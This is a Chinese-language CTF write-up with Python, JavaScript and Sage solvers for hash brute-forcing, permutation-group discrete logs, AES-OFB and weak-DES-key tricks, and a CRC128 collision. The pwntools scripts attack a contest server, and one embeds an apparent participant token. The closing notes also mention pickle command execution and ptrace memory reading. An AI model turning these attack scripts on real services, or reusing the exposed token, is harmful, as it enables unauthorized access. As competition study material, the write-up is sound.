这么一看，按照这个 rev 编号真的爆破的话以我的简单实现来看可能得爆破个两周，比赛时间内大概是来不及的。

## 惜字如金 - HS384

只需还原 `secret` 即可。还好命题组补充说明没有任何大写字母因为本题受到伤害，不然就会因为大小写字母导致的可能性爆炸而不能爆破了。以下是爆破代码：

```py
from hashlib import sha384
import re

def xzrj(string):
	step1=re.sub("([a-zA-Z]*[b-df-hj-np-tv-zB-DF-HJ-NP-TV-Z])(e|E)",lambda match:match.group(1),string)
	step2=re.sub("(b+|c+|d+|f+|g+|h+|j+|k+|l+|m+|n+|p+|q+|r+|s+|t+|v+|w+|x+|y+|z+)",lambda match:match.group(0)[0],step1)
	step3=re.sub("(B+|C+|D+|F+|G+|H+|J+|K+|L+|M+|N+|P+|Q+|R+|S+|T+|V+|W+|X+|Y+|Z+)",lambda match:match.group(0)[0],step2)
	return step3

for e1Count in range(2):
	used1=e1Count
	for e2Count in range(2):
		used2=used1+e2Count
		for sCount in range(28-used2):
			used3=used2+sCount
			for tCount in range(28-used3):
				used4=used3+tCount
				for c1Count in range(28-used4):
					used5=used4+c1Count
					for dCount in range(28-used5):
						used6=used5+dCount
						for c2Count in range(28-used6):
							used7=used6+c2Count
							nCount=28-used7
							secret=''.join([
								'u',
								's',
								's'*sCount,
								't',
								't'*tCount,
								'c',
								'c'*c1Count,
								'e'*e1Count,
								'.',
								'e',
								'd',
								'd'*dCount,
								'u',
								'.',
								'c',
								'c'*c2Count,
								'n',
								'n'*nCount,
								'e'*e2Count,
							])
							if len(secret)!=39:
								print('gen fault',secret)
								exit()
							if xzrj(secret)!='ustc.edu.cn':
								print('xzrj fault',secret)
								exit()
							digest=(sha384(bytes(secret,'utf-8')).hexdigest())
							simplified=xzrj(digest)
							if simplified=='ec18f9dbc4aba825c7d4f9c726db1cb0d0babf47fa170f33d53bc62074271866a4e4d1325dc27f644fdad':
								print(simplified,secret,digest)
								exit()
							if simplified=='ec18f9dbc4aba825c7d4f9c726db1cb0d0babf47fea170f33d53bc62074271866a4e4d1325dc27f644fdad':
								print(simplified,secret,digest)
								exit()
print('not found')
```

得到 `secret` 之后填回去运行即可。

## 量子藏宝图

量子密码学科普问题。在第一章-第一幕，首先我们生成一下制备基底和量子态。

```js
document.getElementById("aliceBasis").value=new Array(512).fill(null).map(()=>Math.random()>0.5?"+":"x").join("")
document.getElementById("aliceResult").value=new Array(512).fill(null).map(()=>Math.random()>0.5?"0":"1").join("")
```

然后是计算密钥。我们把制备基底和测量基底相同时的量子态提取出来，作为密钥。

```js
document.getElementById("secretKey").value=""
for(let i=0;i<512;i++){
	if(document.getElementById("aliceBasis").value[i]==document.getElementById("bobBasis").value[i]){
		document.getElementById("secretKey").value+=document.getElementById("aliceResult").value[i]
	}
}
```

最后是解析藏宝图。提示说是 [Bernstein-Vazirani 算法](https://qiskit.org/textbook/ch-algorithms/bernstein-vazirani.html){: target="_blank" rel="noopener"}，也就是说，中间的部分是将一个秘密字符串按位乘到上面去再求和。在前面那个介绍页面中实验发现，中间的比特如果有和底部的哪一个比特连接，则对应位为 1，反之则为 0，并且图中的 X、Z 门都是不需要关心的。那么手动抄写一下比特再转成 ASCII 字符就好。

## 置换魔群 - 置换群上的超大离散对数

这里的要点是生成阶的最小公倍数尽可能大的两个元素。一开始采取启发式的搜索方式发现不够大，最后借鉴了 [OEIS 上的 A000793 （也就是置换群元素最大阶的数列）的页面](http://oeis.org/A000793){: target="_blank" rel="noopener"} 上的算法，先确定性的算出阶最大的元素，再算出阶与最大的阶互质的元素中阶最大的元素。这样二者的阶的最小公倍数就能达到所需要的阶的 99% 甚至 100% 以上，再套用第二小题的方法，就（几乎）能得出正确结果了。代码如下：

```py
import pwn
import json
import math
import sympy
import heapq
from functools import reduce
from sympy.ntheory import factorint
from sympy.ntheory.modular import crt
from permutation_group import permutation_element, permutation_group

conn = pwn.remote('202.38.93.111',10114)
conn.send(b'<id>:<token>\n')
conn.recvuntil(b"> your choice: ")
conn.send(b'3\n')

def genLoopWithInvalidPrimes(length,used_primes=set()):
	lcm=[1]*(length+1)
	loops=[[]]*(length+1)
	primes=[[]]*(length+1)
	for p in sympy.primerange(2, length+1):
		if p in used_primes:
			continue
		for i in range(length, p-1, -1):
			hi = lcm[i]
			result_pp=loops[i]
			prime_pp=primes[i]
			pp = p
			while pp <= i:
				new_hi=(pp if i==pp else lcm[i-pp]*pp)
				if new_hi>hi:
					hi = new_hi
					result_pp = [*loops[i-pp],pp]
					prime_pp =  [*primes[i-pp],p]
				pp *= p
			lcm[i] = hi
			loops[i]=result_pp
			primes[i]=prime_pp
	print(loops[length],primes[length])
	return loops[length],primes[length]

def genLoops(length):
	loop1,primes=genLoopWithInvalidPrimes(length)
	loop2,_=genLoopWithInvalidPrimes(length,primes)
	return loop1,loop2

def permFromLoops(loops,length):
	perm_list=[]
	for loop in loops:
		perm_list.append(len(perm_list)+loop)
		for i in range(loop-1):
			perm_list.append(len(perm_list))
	print(len(perm_list),length)
	while len(perm_list)<length:
		perm_list.append(len(perm_list)+1)
	return permutation_element(length,perm_list)

def collectModVal(conn,g,mods,vals):
	conn.recvuntil(b"(a list): ")
	conn.sendline(bytes(str(g),encoding="utf-8"))
	conn.recvuntil(b" : ")
	key = permutation_element(n,json.loads(conn.recvuntil(b"]")))
	print('[',len(key.standard_tuple),']')
	for std_tuple in key.standard_tuple:
		first=std_tuple[0]
		second=std_tuple[1 if len(std_tuple) > 1 else 0]
		mapped_tuple=next(x for x in g.standard_tuple if first in x)
		first_idx=mapped_tuple.index(first)
		second_idx=mapped_tuple.index(second)
		print("--")
		print(first_idx,second_idx)
		l=len(mapped_tuple)
		step=(second_idx-first_idx)%l
		print(l,step)
		if l not in mods:
			mods.append(l)
			vals.append(step)
	return key

for _ in range(15):
	conn.recvuntil(b"n = ")
	n = int(conn.recvuntil(b"\n")[:-1])
	conn.recvuntil(b"upper bound for my private key is ")
	bound = int(conn.recvuntil(b"\n")[:-1])
	print(n,bound)
	loop1,loop2=genLoops(n)
	p1=permFromLoops(loop1,n)
	p2=permFromLoops(loop2,n)
	# print(p1,p2)
	target=p1.order()*p2.order()
	print(target)
	print(bound)
	mods=list()
	vals=list()
	key1=collectModVal(conn,p1,mods,vals)
	key2=collectModVal(conn,p2,mods,vals)
	result,modular=crt(mods,vals)
	print(result)
	print(modular,target)
	print(p1**result==key1)
	print(p2**result==key2)
	print("prob of correct",min(target / bound,1))
	print(mods)
	print(vals)
	conn.recvuntil(b"> your answer: ")
	conn.sendline(bytes(str(result),encoding="utf-8"))
	result=conn.recvuntil(b"d")
	if result==b'Bad':
		exit()

conn.interactive()
```

当然也可以动态规划找两个元素的最大阶，不过那样用 python 写可能效率太慢了，所以没有采取这种方法。

不过编写这个脚本的时候发现 Sympy 的 `crt` 函数居然会在有重复的输入的时候错误地给出比预期的模更大的结果，所以生成它的输入的时候做了去重。

## 不可加密的异世界 - 疏忽的神

既然加密的消息还没有 AES 的一个块长，我只需要使用 OFB 模式，让 iv 被 key 加密之后为全零，这样和原文异或之后就和原文一致了。代码如下：

```py
import os
import pwn
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from magic_box import Magic_box

conn = pwn.remote('202.38.93.111',10110)
conn.send(b'<id>:<token>\n')
conn.recvuntil(b"> choice: ")
conn.send(b'1\n')

conn.recvuntil(b"> name: ")
conn.send(b'a\n')
conn.recvuntil(b"> algo: ")
conn.send(b'AES\n')
conn.recvuntil(b"> mode: ")
conn.send(b'OFB\n')

message=pad(b'aOpen the door!',16)

key=os.urandom(16)
aes=AES.new(key, AES.MODE_ECB)
iv=aes.decrypt(b'\x00'*16)

magic_box = Magic_box("AES", "OFB", key+iv)
print(magic_box.auto_enc(message))
print(message)

conn.recvuntil(b"> hex keys: ")
conn.send((key+iv).hex().encode()+b"\n")

conn.interactive()
```

## 不可加密的异世界 - 心软的神

和上一小题一样，只需要使用 OFB 模式，再让 iv 被 key 加密 n 次之后为全零，这样和原文异或之后第 n 块就和原文一致了。代码如下：

```py
import os
import pwn
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from magic_box import Magic_box

conn = pwn.remote('202.38.93.111',10110)
conn.send(b'911:MEUCIAwRnzmZqFcPjbiKd9wmy3Ipxp7sZ6Qf8xxcKg7wrdOoAiEAlMbxiD12WWHv/Kc4mHHptGSXIc2Argrpa72lrVJA8Ho=\n')
conn.recvuntil(b"> choice: ")
conn.send(b'2\n')

conn.recvuntil(b"> name: ")
conn.send(b'a\n')
conn.recvuntil(b"> algo: ")
conn.send(b'AES\n')
conn.recvuntil(b"> mode: ")
conn.send(b'OFB\n')

conn.recvuntil(b"you_pass : ")
my_pass=bytes.fromhex(conn.recvuntil(b"\n")[:-1].decode())

print(my_pass)

key=os.urandom(16)
aes=AES.new(key, AES.MODE_ECB)
iv=b'\x00'*16

for i in range(10):
	conn.recvuntil(b"> hex keys: ")
	iv=aes.decrypt(iv)

	magic_box = Magic_box("AES", "OFB", key+iv)
	print(magic_box.auto_enc(my_pass)[i*16:(i+1)*16])
	print(my_pass[i*16:(i+1)*16])
	conn.send((key+iv).hex().encode()+b"\n")

conn.interactive()
```

## 不可加密的异世界 - 严苛的神

什么，要加密两次，那我直接用 DES 的 ECB 模式，再直接塞一个 DES 弱密钥进去不就好了吗。然而，密钥是密文的某种 CRC128，所以我们需要找一个 CRC128 刚好是全 0 的串。众所周知，CRC 的一个比特的变化改变的结果中的比特是确定的，所以我只需要装一个 Sagemath 解一个模 2 的线性方程组就好。代码如下：

```py
from sage.all import *

def crc128(data, poly=0x883ddfe55bba9af41f47bd6e0b0d8f8f):
    crc = (1 << 128) - 1

    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ (poly & -(crc & 1))

    return crc ^ ((1 << 128) - 1)

def u128_to_bytes(n):
	return bytes(reversed([(n//(256**i))%256 for i in range(16)]))

c0=crc128(u128_to_bytes(0))
p=[crc128(u128_to_bytes(2**i))^c0 for i in range(128)]

F=Zmod(2)
L=Matrix(F,128,128)
for i in range(128):
	for j in range(128):
		L[i,j]=(p[i]//(2**j)) % 2

target=vector([(c0//(2**i)) % 2 for i in range(128)])

ans=L.solve_left(vector(F,target))
val=0
for i in range(128):
	val+=int(ans[i])*(2**i)
val_bytes=u128_to_bytes(val)
print(val_bytes.hex())
print(crc128(val_bytes))
```

运行后直接把结果复制到题目里就好。

不过说起来 Sage 官方文档里都说 Windows 用户请使用 WSL 运行，就不能学习 numpy 和 sympy 做一下原生的 Windows 支持么。

## 关于其他未解出的题目

以上就是我所有解出的题目的 Writeup 了。这里我再大致评论一下我没解出的题目：

- 安全的在线测评 - 动态数据：本来以为是要想办法提权的，结果其实只需要在编译器把文件包含进来就好了，考虑得还不够全面啊。而且第一小题的 flag 里是有提示的，还是看得不够仔细。
- 二次元神经网络：一看是机器学习就不想做。然而果然作为 web 分类的题目，它的解法是和机器学习本身无关的。之前也是知道 pickle 是能任意命令执行的，没有想到也是不太应该。
- 惜字如金 - RS384：搜索的时候搜到了 Coppersmith 方法，但是没有仔细研究质数的结构所以没有想到。总之学习了。
- 矩阵之困：之前翻 HackerNews 的时候有注意到新的矩阵乘法算法，但是完全没有看出来这个题和那个是有关联的。总之学习了。
- 链上记忆大师 - 牛刀小试：查到了回滚的时候 gas 不会回滚，也想到了对应的思路，然而配环境调试 gas 数量实在是太麻烦了所以没有做。不过官方题解提到了有直接利用题目平台调试的方法，当时还是应该尝试一下的。
- 链上记忆大师 - 终极挑战：原来可以探测冷热地址啊，学习了。
- 传达不到的文件：听说这题非预期解挺多的。我尝试了一下用 busybox printf 创建二进制文件然后 ptrace 直接读内存发现不工作就放弃了，结果原来其实还可以读写寄存器改系统调用泄露二进制文件。更后面的步骤我自然也接触不到了。不过连非预期解都找不到还是有点不太行的。
- 《关于 RoboGame 的轮子永远调不准速度这件事》：什么臭题。由于不懂这个 8051 架构所以根本没有从题目描述中读出来可以在 0x24 端口读写固件的内容。学习了。
- 壹...壹字节？：没仔细看这题，看着就很难，不过看题解似乎也不是特别复杂，虽然就算看了也不一定能想到。学习了。
- 小 Z 的靓号钱包：这就在我的知识范围外了。学习了。
- 火眼金睛的小 E：因为懒所以没做第一小题。至于第二小题的自动化部分还是有点复杂的，而第三小题就更复杂了。而且这个题还是需要拼概率的。总之学习了。
- evilCallback：本届的压轴题。虽然平常在写 JavaScript，但是还真不了解 v8 这一套。总之还是了解一下。

## 总结

今年拿到了 16 名，比去年下降了一名，不过拿到了 7050/11150 分，和去年相比增加了不少。看来 BPC 还是小有进步，只是比赛变卷了而已。

另外就是，今年跑了脚本爆破了一个颜色为 #FF7F00 的 Tag（也就是 #80qb19）。不过不了解我的人可能很难想到这个颜色的意义，下次可能试试重新爆破一个更人类可读的 Tag 吧。

总之，明年有空一定还来。